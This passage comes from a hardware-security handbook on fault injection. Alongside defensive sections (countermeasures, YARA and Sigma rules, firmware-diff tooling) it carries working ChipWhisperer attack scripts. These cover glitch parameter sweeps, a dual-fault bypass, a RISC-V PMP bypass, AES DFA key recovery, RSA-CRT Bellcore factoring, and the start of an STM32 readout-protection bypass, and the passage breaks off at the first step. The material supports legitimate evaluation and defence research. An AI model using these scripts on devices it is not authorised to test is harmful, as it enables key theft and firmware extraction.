**Tamper-evident packaging.** Devices protected by conformal coatings, tamper-evident enclosures, or active mesh shields provide visual evidence of physical attack. The mesh shield (a fine conductive mesh covering the die, monitored for continuity) triggers a tamper event if cut or penetrated. Anti-tamper mesh is standard on payment terminals (PCI PTS requirements), HSMs (FIPS 140-3 Level 3+), and military cryptographic modules (NSA Type 1).

**Permanent lockout indicators.** Some secure elements enter a permanent lockout state after detecting a configurable number of consecutive tamper events. The lockout state is stored in OTP fuses, which cannot be reversed. Forensic examination of a locked-out device reveals the lockout fuse state, confirming that the device's tamper detection triggered during an attack attempt.

### 12.4 Defending against fault injection in fielded systems

For systems that must resist fault injection in adversarial physical environments (ATMs, point-of-sale terminals, automotive ECUs in exposed locations, military equipment), defense requires a layered approach that combines hardware monitoring, software resilience, and environmental protection.

**Environmental hardening.** Potting compounds (epoxy resin encapsulating the PCB) prevent physical access to ICs and traces. Conformal coatings protect against chemical decapsulation. Tamper-responsive enclosures (with active monitoring of enclosure integrity) trigger key zeroization if opened. These measures increase the attacker's required equipment level from "ChipWhisperer on a bench" to "specialized laboratory with CNC, chemical hoods, and micro-probing stations."

**Runtime integrity monitoring.** Firmware that periodically verifies its own integrity (checking critical configuration registers, re-reading and validating security-critical OTP values, verifying that execution is proceeding along expected code paths) can detect post-glitch corruption. If a glitch corrupted a security setting but the device continued running, the next integrity check catches the anomaly and triggers a recovery action (re-reading the correct value from flash, re-asserting the security configuration, or entering a safe state).

**Secure state machines.** Replacing simple boolean flags (`is_authenticated = true/false`) with multi-value state machines (e.g., `UNAUTHENTICATED → CHALLENGE_SENT → RESPONSE_VERIFIED → SESSION_ACTIVE`) with explicit state-transition validation makes single-instruction glitches far less effective. Glitching a single comparison can flip a boolean flag, but corrupting a multi-state variable to a valid next state requires far more precise control.

**Redundant security checks with diversity.** Rather than a single `if (signature_valid)` check, implement the verification twice using different code (different register usage, different instruction scheduling, compiled with different optimization levels if possible) and compare both results. A single glitch can skip one check but not two checks implemented with different code patterns at different times. Triple modular redundancy (TMR) with majority voting provides even stronger protection.

### 12.5 YARA rules for FI-modified firmware

Firmware that has been modified via fault injection — or firmware images extracted after a successful FI attack — exhibit characteristic patterns. The following YARA rules detect common indicators in ARM Cortex-M firmware binaries.

```yaml
rule FI_NOP_Sled_ARM_Thumb
{
    meta:
        description = "Detects ARM Thumb NOP sled (4+ consecutive NOP instructions) — indicator of FI-corrupted branch region"
        author = "Hardware Security Team"
        date = "2026-05-08"
        severity = "medium"

    strings:
        $nop_thumb = { C0 46 C0 46 C0 46 C0 46 }  // 4x MOV R0,R0 (Thumb NOP)
        $nop_thumb2 = { 00 BF 00 BF 00 BF 00 BF }  // 4x NOP.W (Thumb-2)

    condition:
        uint16(0) == 0x2000 and   // ARM vector table: SP init at offset 0
        any of ($nop_thumb*)
}

rule FI_Corrupted_Signature_Magic
{
    meta:
        description = "Firmware image with zeroed or corrupted signature block — possible FI bypass of secure boot"
        date = "2026-05-08"
        severity = "high"

    strings:
        $sig_zeroed = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }
        $rsa_magic = { 30 82 }    // ASN.1 SEQUENCE header (RSA signature)

    condition:
        filesize < 2MB and
        $sig_zeroed at (filesize - 256) and
        not $rsa_magic in (filesize - 300 .. filesize)
}

rule FI_Branch_Patch_ARM
{
    meta:
        description = "Conditional branch replaced with unconditional (B) — FI or patch to bypass security check"
        date = "2026-05-08"
        severity = "high"

    strings:
        // ARM A32: unconditional branch (0xEA) where conditional expected
        $uncond_branch = { EA ?? ?? ?? }
        // Thumb: unconditional B replacing BNE/BEQ
        $thumb_b = { E0 E7 }  // B -64 (short unconditional)

    condition:
        uint16(0) == 0x2000 and
        (#uncond_branch > 20 or #thumb_b > 15)
}
```

### 12.6 Sigma rules for FI-related log indicators

Fault injection campaigns produce distinctive patterns in system logs: rapid reboot sequences, watchdog/brownout resets, and CRC failures on flash reads.

```yaml
title: Rapid Reboot Sequence — Possible Fault Injection Campaign
id: d7f3a1e2-9b4c-4f8a-b5d6-1e2f3a4b5c6d
status: experimental
date: 2026/05/08
logsource: {category: embedded_syslog, product: microcontroller}
detection:
    selection:
        EventType: "RESET"
        ResetSource|contains: ["BOR","WATCHDOG","NRST","SOFTWARE"]
    timeframe: 5m
    condition: selection | count() > 50
level: high
tags: [attack.t1190, attack.hardware]
---
title: Brownout Without Facility Power Anomaly
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
date: 2026/05/08
logsource: {category: embedded_syslog, product: microcontroller}
detection:
    selection: {EventType: "RESET", ResetSource: "BOR"}
    filter: {FacilityPowerStatus: "NORMAL"}
    condition: selection and not filter
level: high

---
title: Flash CRC Failure Burst — FI or TOCTOU Indicator
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
date: 2026/05/08
logsource: {category: embedded_syslog, product: microcontroller}
detection:
    selection:
        EventType|contains: ["CRC_FAIL","FLASH_ERR","ECC_CORRECTION"]
    timeframe: 1m
    condition: selection | count() > 10
level: medium
```

### 12.7 Firmware integrity verification scripts

Post-incident, the analyst compares a firmware dump extracted from a potentially-compromised device against a known-good reference. The following script performs hash comparison, entropy analysis (high-entropy regions may indicate encrypted or corrupted data), and disassembly diff of branch instructions.

```python
import hashlib, math
from pathlib import Path

def sha256_file(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(8192), b""): h.update(c)
    return h.hexdigest()

def entropy_blocks(data, bs=256):
    out = []
    for i in range(0, len(data), bs):
        blk = data[i:i+bs]
        if not blk: break
        freq = [0]*256
        for b in blk: freq[b] += 1
        n = len(blk)
        out.append(-sum((c/n)*math.log2(c/n) for c in freq if c))
    return out

def diff_firmware(reference, suspect):
    ref, sus = Path(reference).read_bytes(), Path(suspect).read_bytes()
    diffs = [{"offset": hex(i), "ref": hex(ref[i]), "sus": hex(sus[i])}
             for i in range(min(len(ref), len(sus))) if ref[i] != sus[i]]
    re, se = entropy_blocks(ref), entropy_blocks(sus)
    anomalies = [{"block": i, "offset": hex(i*256),
                  "ref_ent": round(r,3), "sus_ent": round(s,3)}
                 for i,(r,s) in enumerate(zip(re,se)) if abs(r-s) > 0.5]
    return {"ref_sha256": sha256_file(reference),
            "sus_sha256": sha256_file(suspect), "match": ref == sus,
            "diff_offsets": diffs, "entropy_anomalies": anomalies}
```

---

## 13. ChipWhisperer automation and scripting

### 13.1 Voltage glitch parameter sweep

A complete voltage glitch campaign automates the three-parameter sweep described in §1.6. The following script scans width and offset for a fixed amplitude, classifies each attempt, and logs results for later visualization.

```python
import chipwhisperer as cw
import numpy as np
import time
import csv
import logging
from datetime import datetime, timezone

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("vglitch")

# ---------- connect ----------
scope = cw.scope()
target = cw.target(scope)
scope.default_setup()

# Husky-specific: verify platform and configure ADC segments
assert scope.fpga_buildtime, "Could not read FPGA build time — check USB"
scope.adc.samples = 5000
scope.adc.offset = 0

# ---------- glitch engine ----------
scope.glitch.clk_src = "clkgen"          # use internal clock generator
scope.glitch.output = "enable_only"      # crowbar mode (VCC to GND)
scope.glitch.trigger_src = "ext_single"  # one glitch per trigger

scope.io.glitch_hp = True; scope.io.glitch_lp = False  # high-power MOSFET

def reset_target():
    scope.io.nrst = "low"; time.sleep(0.05)
    scope.io.nrst = "high_z"; time.sleep(0.05)

def classify_response(tgt, timeout_ms=200):
    resp, t0 = "", time.time()
    while time.time() - t0 < timeout_ms / 1000:
        resp += tgt.read()
        if resp: break
    if not resp:       return "mute"
    if "flag" in resp: return "success"
    if "ok" in resp:   return "normal"
    return "crash"

# ---------- 3-D sweep: ext_offset × width × offset ----------
stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
with open(f"vglitch_{stamp}.csv", "w", newline="") as fh:
    writer = csv.writer(fh)
    writer.writerow(["width","offset","ext_offset","result","timestamp"])
    total = successes = 0
    for ext_off in range(0, 1200):
        scope.glitch.ext_offset = ext_off
        for width in np.arange(-49, 49, 0.5):
            scope.glitch.width = width
            for offset in np.arange(-49, 49, 0.5):
                scope.glitch.offset = offset
                scope.glitch.repeat = 1
                reset_target(); scope.arm()
                target.simpleserial_write("p", bytearray(16))
                if scope.capture(): reset_target(); continue
                r = classify_response(target)
                writer.writerow([width, offset, ext_off, r,
                                 datetime.now(timezone.utc).isoformat()])
                total += 1
                if r == "success":
                    successes += 1
                    log.info("HIT w=%.1f off=%.1f ext=%d", width, offset, ext_off)
    log.info("Done: %d/%d (%.2f%%)", successes, total,
             successes/total*100 if total else 0)
scope.dis(); target.dis()
```

The `classify_response` function must be adapted per target. For SimpleSerial targets (the ChipWhisperer tutorial ecosystem), the target echoes a byte indicating pass or fail. For real-world targets, the analyst monitors UART output, SWD connectivity, or GPIO state to determine whether the glitch succeeded, had no effect, caused a reset, or left the device unresponsive (mute).

### 13.2 Clock glitch parameter sweep

Clock glitching uses the same sweep infrastructure with different glitch engine configuration. The critical change is `scope.glitch.output = "clock_xor"` (or `"clock_or"`), which inserts extra edges into the target clock rather than pulling VCC low.

```python
# -- clock glitch configuration (replaces voltage section above) --
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "clock_xor"       # XOR extra edge into target clock
scope.glitch.trigger_src = "ext_single"
scope.io.hs2 = "glitch"                 # route glitch clock to HS2 header
# The sweep loop is identical to §13.1 — only the engine mode differs.
```

Clock glitch sweeps converge faster than voltage sweeps because the parameter space has fewer dimensions (no amplitude — the extra edge is either present or not). The dominant parameters are ext_offset (which clock cycle) and width/offset (where within the cycle the extra edge falls). A two-dimensional sweep of ext_offset × width with fixed offset is often sufficient.

### 13.3 Target reset and communication automation

Reliable target reset is the foundation of any automated glitch campaign. A single hung target wastes minutes of sweep time. A robust reset controller implements three strategies with fallback: (1) assert the nRST line via `scope.io.nrst = "low"` / `"high_z"`, (2) full power cycle via `scope.io.target_pwr`, and (3) SWD SYSRESETREQ via OpenOCD subprocess. The controller tries each in order and verifies the target is alive after each attempt by sending a SimpleSerial ping (`simpleserial_write("v", b"")`) and waiting for a response.

```python
class TargetController:
    def __init__(self, scope, target, boot_delay: float = 0.05):
        self.scope, self.target, self.delay = scope, target, boot_delay

    def ensure_alive(self) -> bool:
        for reset_fn in [self._nrst, self._power_cycle]:
            reset_fn()
            self.target.simpleserial_write("v", b"")
            if self.target.simpleserial_read("r", 1, timeout=200):
                return True
        return False

    def _nrst(self):
        self.scope.io.nrst = "low"; time.sleep(0.01)
        self.scope.io.nrst = "high_z"; time.sleep(self.delay)

    def _power_cycle(self):
        self.scope.io.target_pwr = False; time.sleep(0.2)
        self.scope.io.target_pwr = True; time.sleep(self.delay + 0.2)
```

### 13.4 Result logging and visualization

After a sweep completes, the CSV log is loaded into a heatmap for visual analysis.

```python
import pandas as pd
import matplotlib.pyplot as plt
import matplotlib.colors as mcolors

def plot_glitch_map(csv_path: str, out_png: str = "glitch_map.png") -> None:
    """Render a width × ext_offset heatmap from sweep results."""
    df = pd.read_csv(csv_path)
    color_map = {
        "normal":  0,
        "success": 1,
        "reset":   2,
        "crash":   3,
        "mute":    4,
    }
    df["code"] = df["result"].map(color_map).fillna(4).astype(int)

    pivot = df.pivot_table(index="width", columns="ext_offset",
                           values="code", aggfunc="max")

    cmap = mcolors.ListedColormap(
        ["#cccccc", "#00cc00", "#cc0000", "#ff8800", "#666666"])
    bounds = [-0.5, 0.5, 1.5, 2.5, 3.5, 4.5]
    norm = mcolors.BoundaryNorm(bounds, cmap.N)

    fig, ax = plt.subplots(figsize=(14, 6))
    im = ax.pcolormesh(pivot.columns, pivot.index, pivot.values,
                       cmap=cmap, norm=norm, shading="auto")
    ax.set_xlabel("ext_offset (clock cycles)")
    ax.set_ylabel("width (%)")
    ax.set_title("Voltage Glitch Parameter Map")
    cbar = fig.colorbar(im, ax=ax, ticks=[0, 1, 2, 3, 4])
    cbar.ax.set_yticklabels(["normal", "SUCCESS", "reset", "crash", "mute"])
    fig.tight_layout()
    fig.savefig(out_png, dpi=150)
    plt.close(fig)
    print(f"Saved {out_png}")
```

### 13.5 Multi-target campaign management

When evaluating a product family (e.g., "does this firmware version survive FI across 10 production samples?"), a `CampaignManager` class iterates over a list of target IDs, prompts the analyst to connect each board, runs the same sweep function, and stores per-target CSV logs in a `campaigns/<name>/` directory. After all targets complete, an aggregation method merges the CSVs and computes per-target success rates, crash rates, and total attempts into a summary JSON. This enables statistical claims like "7 of 10 production samples were glitchable within 2000 attempts" — essential for CC/EMVCo evaluation reports.

### 13.6 ChipWhisperer-Husky specific features

The Husky introduced capabilities beyond the CW-Lite that matter for advanced campaigns.

**Segmented capture** allows the ADC to capture multiple short traces (segments) in rapid succession without transferring data to the host between segments. This is critical for glitch sweeps where the analyst wants to capture both the glitch pulse and the target's power response for every attempt without the USB transfer bottleneck.

```python
# Husky segmented capture setup
scope.adc.segments = 100         # capture 100 segments before transfer
scope.adc.samples = 500          # 500 samples per segment
# After arming, the scope captures 100 triggers' worth of traces.
# Transfer all at once:
traces = scope.get_last_trace()  # returns concatenated array
# Reshape: traces.reshape(scope.adc.segments, scope.adc.samples)
```

**SAD (Sum of Absolute Differences) trigger** matches a reference power-trace pattern in real time, triggering when the target's power consumption matches a known signature. This enables triggering on a specific operation (e.g., the AES round-9 SubBytes) without needing an external GPIO toggle or UART event.

```python
# Husky SAD trigger configuration
scope.trigger.module = "SAD"
scope.SAD.reference = reference_trace[100:200]  # 100-sample pattern
scope.SAD.threshold = 500                        # match threshold
# The scope triggers when the live ADC stream matches the reference
# within the threshold — no GPIO trigger needed.
```

**USB 3.0 transfer** on Husky reduces trace-download time by approximately 10× compared to CW-Lite's USB 2.0, making large sweep campaigns significantly faster.

---

## 14. Glitch characterization framework

### 14.1 Automated parameter space exploration

The naive nested-loop sweep (§13.1) works but is slow. For targets with large parameter spaces, smarter exploration strategies reduce time-to-first-success.

```python
import random
from dataclasses import dataclass, field

@dataclass
class GlitchParams:
    width: float
    offset: float
    ext_offset: int
    repeat: int = 1

@dataclass
class GlitchResult:
    params: GlitchParams
    outcome: str             # normal / success / reset / crash / mute
    trace: np.ndarray = field(default=None, repr=False)

class ParameterExplorer:
    """Strategy-based glitch parameter search."""

    def __init__(self, width_range: tuple, offset_range: tuple,
                 ext_range: tuple):
        self.w_min, self.w_max = width_range
        self.o_min, self.o_max = offset_range
        self.e_min, self.e_max = ext_range
        self.history: list[GlitchResult] = []

    # --- strategy: random walk from best known point ---
    def random_walk(self, center: GlitchParams,
                    step_w: float = 2.0, step_o: float = 2.0,
                    step_e: int = 5) -> GlitchParams:
        return GlitchParams(
            width=np.clip(center.width + random.uniform(-step_w, step_w),
                          self.w_min, self.w_max),
            offset=np.clip(center.offset + random.uniform(-step_o, step_o),
                           self.o_min, self.o_max),
            ext_offset=int(np.clip(
                center.ext_offset + random.randint(-step_e, step_e),
                self.e_min, self.e_max)),
        )

    # --- strategy: binary search on ext_offset ---
    def binary_search_ext(self, lo: int, hi: int,
                          test_fn) -> int | None:
        """Find the ext_offset where test_fn transitions from
        normal to success/crash.  test_fn(ext) -> str outcome."""
        while lo < hi:
            mid = (lo + hi) // 2
            result = test_fn(mid)
            if result in ("success", "crash", "reset"):
                hi = mid
            else:
                lo = mid + 1
        return lo if lo < self.e_max else None

    # --- strategy: genetic algorithm ---
    def genetic_step(self, population: list[GlitchResult],
                     n_offspring: int = 20,
                     mutation_rate: float = 0.3) -> list[GlitchParams]:
        """Select the fittest (success > crash > reset > normal > mute),
        crossover, mutate."""
        fitness = {"success": 5, "crash": 3, "reset": 2,
                   "normal": 1, "mute": 0}
        scored = sorted(population,
                        key=lambda r: fitness.get(r.outcome, 0),
                        reverse=True)
        parents = scored[:max(2, len(scored) // 4)]
        children: list[GlitchParams] = []
        for _ in range(n_offspring):
            p1, p2 = random.sample(parents, 2)
            child = GlitchParams(
                width=(p1.params.width + p2.params.width) / 2,
                offset=(p1.params.offset + p2.params.offset) / 2,
                ext_offset=(p1.params.ext_offset
                            + p2.params.ext_offset) // 2,
            )
            if random.random() < mutation_rate:
                child = self.random_walk(child)
            children.append(child)
        return children
```

### 14.2 Classification, statistics, and visualization

The classification function maps raw target responses to one of five categories. The decision logic: no response within 500 ms = mute; no response within 100 ms = reset (fast return implies reboot); SHA-256 match against known-good = normal; target-specific success pattern = success; otherwise crash. For statistical analysis, `collections.Counter` over the result list yields per-outcome counts and rates, while filtering successes reveals the width/offset ranges of the exploitable parameter region.

For publication-quality heatmaps, convert results to a 2D scatter plot (ext_offset vs. width) color-coded by outcome (green = success, red = reset, orange = crash, gray = normal/mute) using matplotlib. The `plot_glitch_map` function in §13.4 handles CSV-based rendering; the `ParameterExplorer` version below works directly from in-memory results:

```python
def plot_heatmap(results: list[GlitchResult], out: str = "map.png"):
    import matplotlib.pyplot as plt
    code = {"normal": 0, "success": 1, "reset": 2, "crash": 3, "mute": 4}
    xs = [r.params.ext_offset for r in results]
    ys = [r.params.width for r in results]
    cs = [code.get(r.outcome, 4) for r in results]
    fig, ax = plt.subplots(figsize=(12, 5))
    ax.scatter(xs, ys, c=cs, cmap="RdYlGn_r", s=2, alpha=0.7)
    ax.set_xlabel("ext_offset"); ax.set_ylabel("width (%)")
    ax.set_title("Glitch Parameter Map")
    fig.tight_layout(); fig.savefig(out, dpi=150); plt.close(fig)
```

---

## 15. CVE reference table

The following table collects publicly-disclosed vulnerabilities that rely on or are directly related to fault injection techniques. All dates and CVSS scores are as originally published.

| CVE ID | Year | Target | Attack type | Impact | CVSS v3.x |
|--------|------|--------|-------------|--------|-----------|
| CVE-2019-11157 | 2019 | Intel x86 (SGX) | Software voltage FI (Plundervolt) — MSR `0x150` undervolt during enclave computation | AES key recovery from SGX enclave via DFA; integrity of SGX compromised | 6.0 (Medium) |
| CVE-2018-6242 | 2018 | NVIDIA Tegra X1 (Nintendo Switch) | BootROM USB buffer overflow enabling unsigned code load; voltage glitch variant demonstrated independently | Unsigned code execution; permanent (mask ROM, unpatchable on affected HW) | 6.2 (Medium) |
| CVE-2019-15894 | 2019 | Espressif ESP32 (v0/v1) | Voltage FI on CPU during secure-boot digest verification at reset | Bypass Secure Boot, boot unverified code from flash; mitigated when Flash Encryption also enabled | 6.8 (Medium) |
| CVE-2019-17391 | 2019 | Espressif ESP32 (v0/v1) | Voltage FI immediately after reset corrupts eFuse read-protection bits | Recovery of Flash Encryption key and Secure Boot key from eFuse; unpatchable on pre-v3 silicon | 6.8 (Medium) |
| CVE-2020-13629 | 2020 | Espressif ESP32 (v0/v1) | FI bypass of encrypted secure boot — fault skips signature check even with flash encryption enabled | Secure boot bypass on encrypted firmware; combined with CVE-2020-15048 for full compromise | 6.8 (Medium) |
| CVE-2020-15048 | 2020 | Espressif ESP32 (v0/v1) | Ciphertext manipulation + FI to redirect PC during ROM boot with flash encryption active | Bypass flash encryption and secure boot together; arbitrary code execution | 6.8 (Medium) |
| CVE-2020-27211 | 2020 | Nordic nRF52840 | Voltage FI during APPROTECT check at boot | Debug port re-enabled; full flash readout via SWD | 4.6 (Medium) |
| CVE-2017-18347 | 2017 | Qualcomm MSM (Snapdragon) | CLKscrew — software DVFS abuse from kernel driver to fault TrustZone code via overclocking | Fault in TrustZone RSA signature verification; self-signed code loaded into secure world | 7.0 (High) |

Many fault-injection bypasses on embedded platforms (STM32 RDP glitching, Infineon secure-element EMFI, Microchip SAM boot bypass) have been publicly demonstrated and documented in academic papers and conference talks but were disclosed without formal CVE assignment. The CWE most relevant to voltage and clock glitching is **CWE-1247: Improper Protection Against Voltage and Clock Glitches**. Hardware vendors increasingly acknowledge these attack classes in errata and security advisories rather than through the CVE process.

---

## 16. Advanced fault injection exploitation

### 16.1 Multi-fault campaigns: combining voltage and EM glitch

Production-grade secure-boot chains and cryptographic implementations increasingly deploy dual-check countermeasures (§10.2): the signature verification result is checked twice, or a hardware glitch detector resets the chip before a single fault takes effect. Defeating these defenses requires injecting two or more faults in a single power cycle with independent timing — a multi-fault campaign.

**Architecture.** A practical dual-fault setup uses two independent injection paths controlled by a single FPGA trigger chain:

1. **First fault (EM):** a PicoEMP or ChipSHOUTER pulse, fired at `trigger + offset_1`, targets the voltage monitor circuit (typically located near the analog peripherals on the die). The goal is to desensitize or latch the monitor in a non-alarm state.
2. **Second fault (voltage):** a ChipWhisperer crowbar glitch at `trigger + offset_2` targets the actual security check (instruction skip on the branch following `verify_signature()`).

The FPGA emits two independent glitch-enable signals on separate GPIO pins, each with its own ext_offset counter. On ChipWhisperer-Husky, this requires custom HDL modifications to the glitch module to support a second trigger channel, or the use of the Husky's auxiliary I/O output driving an external PicoEMP trigger:

```python
# Dual-fault trigger: CW-Husky crowbar + PicoEMP on Husky aux IO
import chipwhisperer as cw

scope = cw.scope()
scope.clock.clkgen_freq = 8_000_000
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"  # crowbar for fault #2

# Fault #1 — EM pulse via aux IO trigger to PicoEMP
scope.io.aux_io_mcx = "glitch_out"   # route second glitch channel
scope.glitch.width = 8.0             # narrow pulse for EM trigger
scope.glitch.offset = 0.0

# Fault timing parameters (discovered via coarse sweep first)
EM_EXT_OFFSET   = 1840   # clock cycles: hits glitch detector
VCC_EXT_OFFSET  = 1893   # clock cycles: hits BNE after verify
VCC_WIDTH       = 42.0   # crowbar pulse width (%)

def dual_glitch(scope, target):
    """Arm and fire both faults on a single reset cycle."""
    scope.glitch.ext_offset = EM_EXT_OFFSET
    scope.arm()
    target.reset()              # release reset — target boots
    ret = scope.capture()       # blocks until trigger + EM fires

    # Immediately reconfigure for VCC glitch on the same boot
    scope.glitch.ext_offset = VCC_EXT_OFFSET
    scope.glitch.width = VCC_WIDTH
    scope.glitch.output = "enable_only"
    scope.arm()
    ret2 = scope.capture()      # second glitch fires
    return read_target_response(target)
```

The timing relationship between the two faults is critical. If the EM pulse arrives too early, the monitor recovers before the voltage glitch fires. If too late, the monitor has already flagged the voltage glitch. Practical dual-fault campaigns require a two-dimensional parameter sweep: `(EM_ext_offset, VCC_ext_offset)` with the difference typically constrained to 20–200 clock cycles.

**Success rates.** Single-fault campaigns on unprotected targets achieve 0.1–5% success rates within the parameter sweet spot. Dual-fault campaigns against monitored targets achieve 0.001–0.1% success rates, requiring 10,000–1,000,000 boot cycles. At 50 ms per cycle, a million-attempt sweep completes in approximately 14 hours — well within practical lab timelines.

### 16.2 FI on ARM TrustZone secure-world entry

ARM TrustZone partitions the processor into Normal World (NW) and Secure World (SW). Transitions occur via the SMC (Secure Monitor Call) instruction, which vectors into the Secure Monitor at EL3. The monitor validates the call, switches the NS (Non-Secure) bit in the SCR_EL3 register, and branches to the secure-world entry point.

A voltage glitch during the SCR_EL3 write can corrupt the NS-bit update, leaving the processor in a state where it believes it is in the Secure World while retaining Normal World context — or, more usefully, causing the Secure Monitor to skip the validation checks that restrict which SMC calls are permitted.

**Target: Cortex-A53 on Raspberry Pi 3B+ (BCM2837)**

```
# Trigger point identification via SPA:
# 1. Monitor power trace during cold boot
# 2. Identify ATF (ARM Trusted Firmware) BL31 entry at ~12 ms after RESET
# 3. Locate the SCR_EL3 MSR instruction cluster — appears as a
#    distinctive 3-cycle power signature (load-modify-store)

# ChipWhisperer trigger setup: GPIO toggle from modified BL31
# Insert: "GPIO_SET(TRIGGER_PIN);" before scr_el3 write in bl31_main.c
# (requires reflashing ATF — feasible when attacker controls NW firmware)
```

The practical constraint is trigger synchronization: unlike microcontrollers where boot timing is deterministic from RESET, application processors with DDR initialization have variable boot times. The attacker must either use a power-trace pattern-match trigger (ChipWhisperer SAD trigger matching the SCR_EL3 power signature) or instrument the Normal World firmware to emit a GPIO trigger at a known offset before the critical SMC call.

### 16.3 RISC-V PMP bypass via glitch

RISC-V Physical Memory Protection (PMP) enforces access-control rules via CSR registers (`pmpcfg0`–`pmpcfg15`, `pmpaddr0`–`pmpaddr63`). On boot, the secure firmware configures PMP entries to lock M-mode memory (firmware, keys) from S-mode and U-mode access. The PMP configuration is latched into CSRs that S/U-mode cannot write.

A voltage glitch during the CSRW instruction that writes `pmpcfg0` can corrupt the configuration bits, specifically the L (Lock), R (Read), W (Write), and X (Execute) bits. Corrupting the L bit from 1 to 0 leaves the PMP entry unlocked, allowing subsequent S-mode code to reconfigure it. Corrupting the R/W/X bits from restrictive to permissive opens the protected region.

```python
# RISC-V PMP bypass: target SiFive FE310 (HiFive1 Rev B)
# PMP CSR write occurs at a fixed offset from RESET (no MMU, no DRAM init)
# Boot timing is deterministic to within ±2 clock cycles

import chipwhisperer as cw

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.clock.clkgen_freq = 16_000_000   # FE310 external clock
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"

# PMP configuration write occurs ~340 cycles after reset
# (determined via SPA trace of boot ROM)
PMP_EXT_OFFSET_MIN = 330
PMP_EXT_OFFSET_MAX = 355

def pmp_bypass_sweep(scope, target):
    results = []
    for ext in range(PMP_EXT_OFFSET_MIN, PMP_EXT_OFFSET_MAX):
        for width in [w / 10 for w in range(50, 120, 5)]:
            scope.glitch.ext_offset = ext
            scope.glitch.width = width
            scope.arm()
            target.reset()
            scope.capture()
            # Probe: attempt to read M-mode region from S-mode
            resp = target.simpleserial_read("r", timeout=200)
            if resp and resp != b"\x00" * 16:
                results.append({"ext": ext, "width": width,
                                "data": resp.hex()})
    return results
```

The FE310's PMP implementation has no redundancy on the CSR write path, making it susceptible to single-glitch corruption. More hardened RISC-V implementations (e.g., OpenTitan's Ibex core) include shadow registers and cross-checks on PMP CSR writes, requiring multi-fault attacks.

### 16.4 Practical DFA campaigns: orchestration and automation

§8.1–8.7 describe the mathematical foundations and solver implementations for DFA on AES and RSA-CRT. This section covers the operational side: instrumenting the target, collecting faulty ciphertexts, and feeding them to the solver in an automated loop.

**AES-128 DFA campaign on STM32F3 via ChipWhisperer.**

The target runs AES-128 encryption of a known plaintext, returning the ciphertext over UART. The attacker triggers on the UART TX start bit and glitches at an offset calibrated to hit round 8 (identified via SPA — round boundaries appear as periodic power peaks at ~80 cycle intervals on this target).

```python
import chipwhisperer as cw
from dfa_solver import piret_quisquater_solve  # from §8.7 implementation

scope  = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
cw.program_target(scope, cw.programmers.STM32FProgrammer,
                  "aes_victim.hex")

scope.clock.clkgen_freq = 7_372_800
scope.adc.samples = 5000
scope.adc.offset  = 0
scope.trigger.triggers = "tio4"

# Round-8 offset determined by SPA: 640 ± 20 cycles from trigger
ROUND8_EXT_MIN, ROUND8_EXT_MAX = 620, 660
KNOWN_PT = bytes(range(16))

correct_ct = None
faulty_cts = []

# Phase 1: collect correct ciphertext (no glitch)
scope.glitch.output = "clock_xor"    # benign — no crowbar
scope.arm()
target.simpleserial_write("p", KNOWN_PT)
scope.capture()
correct_ct = target.simpleserial_read("r", 16)

# Phase 2: collect faulty ciphertexts
scope.glitch.output = "enable_only"  # crowbar active
for ext in range(ROUND8_EXT_MIN, ROUND8_EXT_MAX):
    for width in [w / 10 for w in range(30, 80, 5)]:
        scope.glitch.ext_offset = ext
        scope.glitch.width = width
        scope.arm()
        target.simpleserial_write("p", KNOWN_PT)
        if scope.capture():          # timeout — target crashed
            target.reset()
            continue
        ct = target.simpleserial_read("r", 16)
        if ct and ct != correct_ct:
            faulty_cts.append(ct)
            # Attempt solve after each new faulty ciphertext
            key = piret_quisquater_solve(correct_ct, faulty_cts)
            if key:
                print(f"KEY RECOVERED: {key.hex()}")
                break
    else:
        continue
    break
```

Typical recovery requires 2–4 faulty ciphertexts with faults in different AES columns. A focused sweep of 800 parameter points collects sufficient faulty ciphertexts in 5–30 minutes on an STM32F3 target.

**RSA-CRT Bellcore campaign.** The orchestration is simpler because only one faulty signature is needed. The attacker signs a known message repeatedly while sweeping the glitch offset over the CRT computation window. The CRT window is identified via SPA: the modular exponentiation for `s_p` produces a distinctive power signature lasting thousands of clock cycles (square-and-multiply chain). The glitch must land within this window.

```python
from math import gcd

def bellcore_campaign(scope, target, message, pub_key_n, pub_key_e):
    """Sweep glitch parameters during RSA-CRT signing.
    Returns (p, q) if factorization succeeds."""
    # CRT exponentiation window: cycles 50000–120000 from trigger
    for ext in range(50000, 120000, 50):
        for width in [w / 10 for w in range(30, 90, 10)]:
            scope.glitch.ext_offset = ext
            scope.glitch.width = width
            scope.arm()
            target.simpleserial_write("s", message)
            if scope.capture():
                target.reset(); continue
            sig = target.simpleserial_read("r", 256)
            if not sig: continue
            sig_int = int.from_bytes(sig, "big")
            m_int   = int.from_bytes(message, "big")
            # Bellcore check: GCD(sig^e - m, N)
            check = pow(sig_int, pub_key_e, pub_key_n)
            if check != m_int:
                factor = gcd(check - m_int, pub_key_n)
                if 1 < factor < pub_key_n:
                    p = factor
                    q = pub_key_n // p
                    return (p, q)
    return None
```

### 16.5 FI-assisted firmware extraction: readout protection bypass

The most common practical FI target is microcontroller readout protection. STM32 RDP, nRF52 APPROTECT, and ESP32 Secure Boot all rely on configuration bits checked during early boot. Glitching the check allows full flash extraction via the debug port.

**STM32 RDP Level-2 bypass — complete procedure.**

STM32 Read-Out Protection Level 2 permanently disables the debug port (JTAG/SWD). The protection is enforced by Option Bytes in flash, read by the boot ROM within the first ~500 clock cycles after RESET. The boot ROM reads the RDP byte, compares it against the Level-2 magic value (`0xCC`), and if matched, disables the debug port by writing to the DBGMCU registers.

The attack glitches the comparison instruction (a CMP followed by BEQ/BNE in the Cortex-M boot ROM), causing the branch to take the "not Level 2" path, which leaves the debug port enabled.

```bash
# Step 1: Prepare target
# Remove decoupling caps C1, C2, C4 near the STM32 VDD pins
